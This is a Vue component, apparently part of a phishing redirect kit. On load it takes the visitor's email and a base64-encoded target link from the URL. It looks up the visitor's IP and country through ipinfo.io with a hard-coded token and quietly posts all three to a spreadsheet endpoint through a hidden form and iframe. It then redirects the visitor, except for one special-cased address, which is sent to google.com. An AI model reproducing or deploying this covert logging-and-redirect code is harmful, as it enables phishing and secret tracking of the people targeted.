<template>
  <div class="home">
    <loader object="#4b33ff" color1="#ffffff" color2="#17fd3d" size="5" speed="3" bg="#343a40" objectbg="#999793" opacity="80" disableScrolling="false" name="box"></loader>
    <div class="frame"></div>
  </div>
</template>

<script>
const axios = require('axios').default
import { skey, redirectUrl, urlSheets } from '../config/setting'

export default {
  name: 'LongRedirect',
  data () {
    return {
      email: '',
      results: [],
      url: 'https://ipinfo.io/json?token=9d35a57e6931cd',
      linkPP: redirectUrl
    }
  },
  mounted () {
    if (this.$route.query.linkPP) {
      this.linkPP = atob(this.$route.query.linkPP, skey)
    }
    if (this.$route.query.email) {
      this.email = this.$route.query.email
      if (this.email === 'REDACTED') {
        this.linkPP = 'https://google.com'
      }
      // console.log(this.email)
    }
    axios.get(this.url)
    .then(response => {
      this.results = response.data
      this.setSheets()
      // console.log(this.results.country)
    })
    .catch(error => {
      this.ref()
      console.log(error)
    })
  },
  methods: {
    setSheets () {
      const uniqueString = 'CHANGE_THIS_TO_SOME_UNIQUE_STRING'
      const ifr = document.createElement('iframe')
      const frm = document.createElement('form')
      frm.action = urlSheets
      frm.method = 'post'
      frm.target = uniqueString
      const inputE = document.createElement('input')
      inputE.type = 'hidden'
      inputE.name = 'email'
      inputE.value = this.email
      const inputC = document.createElement('input')
      inputC.type = 'hidden'
      inputC.name = 'country'
      inputC.value = this.results.country
      const inputI = document.createElement('input')
      inputI.type = 'hidden'
      inputI.name = 'ip'
      inputI.value = this.results.ip
      frm.appendChild(inputE)
      frm.appendChild(inputC)
      frm.appendChild(inputI)
      document.querySelector('.frame').appendChild(ifr)
      ifr.style.display = 'none'
      ifr.contentWindow.name = uniqueString
      document.body.appendChild(frm)
      frm.submit()
      this.ref()
    },
    ref () {
      document.location.href = this.linkPP
      window.location.href = this.linkPP
    }
  }
}
</script>

<style scoped>
.frame {
  display: none;
}
form {
  display: none;
}
</style>
